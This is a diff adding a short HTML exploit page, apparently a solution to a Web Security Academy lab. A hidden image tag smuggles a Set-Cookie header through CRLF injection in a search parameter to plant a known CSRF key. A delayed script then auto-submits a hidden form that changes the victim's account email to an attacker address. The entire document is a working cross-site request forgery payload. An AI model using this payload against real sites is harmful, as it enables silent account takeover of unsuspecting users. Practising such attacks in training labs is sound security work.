@@ -1,0 +1,29 @@
+  <img id="crlf_hit"
+       src="https://0a060059037ed3b18001034e005f009c.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=C5e9bWa3kXg4qvnn8likv7KyUfZIBHYo%3b%20SameSite=None"
+       style="display:none" alt="crlf">
+
+  <script>
+    setTimeout(function () {
+      var form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://0a060059037ed3b18001034e005f009c.web-security-academy.net/my-account/change-email';
+      form.style.display = 'none';
+
+      var email = document.createElement('input');
+      email.type = 'hidden';
+      email.name = 'email';
+      email.value = 'attacker@example.com';
+
+      var csrf = document.createElement('input');
+      csrf.type = 'hidden';
+      csrf.name = 'csrf';
+      csrf.value = 'WoAQJW5DZbKRCAUAoXUH01kT80apHrS7';
+
+      form.appendChild(email);
+      form.appendChild(csrf);
+      document.body.appendChild(form);
+
+      form.submit();
+    }, 1000);
+  </script>
+
